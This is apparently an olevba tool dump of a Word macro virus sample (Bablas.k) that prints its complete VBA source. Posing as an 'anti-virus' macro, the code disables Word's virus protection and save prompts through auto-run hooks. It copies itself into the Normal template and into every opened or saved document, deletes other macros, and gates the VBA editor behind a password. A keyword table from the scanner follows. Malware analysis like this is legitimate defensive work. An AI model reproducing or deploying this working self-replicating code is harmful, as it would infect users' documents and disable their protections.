olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.k-09b7538b8ccff92abe5b3d46a21954872235d57f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.k-09b7538b8ccff92abe5b3d46a21954872235d57f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FIQRI.bas 
in file: Virus.MSWord.Bablas.k-09b7538b8ccff92abe5b3d46a21954872235d57f - OLE stream: 'Macros/VBA/FIQRI'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub PassAway()
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
End Sub
Sub ToolsMacro()
    OpenMyMacro
End Sub
Sub ViewVbCode()
    ToolsMacro
End Sub

Sub FileTemplates()
    ToolsMacro
End Sub

Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    On Error Resume Next
    Dialogs(wdDialogToolsOptions).Show
    PassAway
End Sub

Sub OpenMyMacro()
    Msg = "MEMPERKENALKAN Anti Virus Macro FIQRI" & Chr(13)
    Msg = Msg & "untuk perlindungan file MS-WORD 97 dari virus yang mematikan" & Chr(13) & Chr(13)
    Msg = Msg & "dimodifikasi oleh SAPRUDIN [ M. Fiqri Aulia's Father ]" & Chr(13)
    Msg = Msg & "call -----> (0254)- 210061" & Chr(13) & Chr(13) & Chr(13)
    Msg = Msg & "SELAMAT MENGGUNAKAN"
    
    If InputBox(Msg, "M. FIQRI AULIA") = "NIDU" Then
       Application.ShowVisualBasicEditor = True
    End If
End Sub

Sub SaveDocument()
    Dim DocOk As Boolean
    DocOk = False
    On Error Resume Next
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "FIQRI" Then DocOk = True
        If Obj.Name <> "FIQRI" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Hapus " + Obj.Name + _
            " Macro pada " + ActiveDocument.Name + "..."
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="FIQRI", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub SaveTemplate()
    Dim NorOk As Boolean
    NorOk = False
    On Error Resume Next
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "FIQRI" Then NorOk = True
        If Obj.Name <> "FIQRI" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Hapus " + Obj.Name + _
            " Macro Pada Normal Template..."
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorOk = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="FIQRI", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub AutoExit()
    Application.Quit
End Sub

Sub FileOpen()
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        SaveDocument
        ActiveDocument.Save
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    PassAway
    SaveTemplate
    On Error Resume Next
    NormalTemplate.Save
End Sub

Sub AutoClose()
    SaveDocument
End Sub

Sub FileClose()
    AutoClose
End Sub

Sub FileSave()
    If ActiveDocument.Saved = False Then
        SaveDocument
        SaveTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

Sub KillMacro()
    C = Documents.Count
    If C <> 0 Then
        Normal.FIQRI.SaveDocument
        WordBasic.DisableAutoMacros False
        On Error Resume Next
        If ActiveDocument.Name <> "Document1" Then ActiveDocument.Save
    Else: Application.OnTime Now + TimeValue("00:00:07"), "Normal.FIQRI.KillMacro"
    End If
End Sub

Sub AutoExec()
    Passwrd = False
    WordBasic.DisableAutoMacros True
    PassAway
    Application.OnTime Now + TimeValue("00:00:07"), "Normal.FIQRI.KillMacro"
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

